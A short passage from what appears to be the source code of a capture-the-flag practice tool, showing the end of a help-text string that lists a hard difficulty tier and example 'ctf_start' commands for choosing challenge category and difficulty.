  HARD   (H)  500 points — Complex analysis or chained techniques

  ── Getting Started ──────────────────────────────────────────
  ctf_start                         Random easy challenge
  ctf_start category=crypto         Crypto challenge (easy)
  ctf_start category=web difficulty=hard   Hard web challenge
`
    },
  })
}
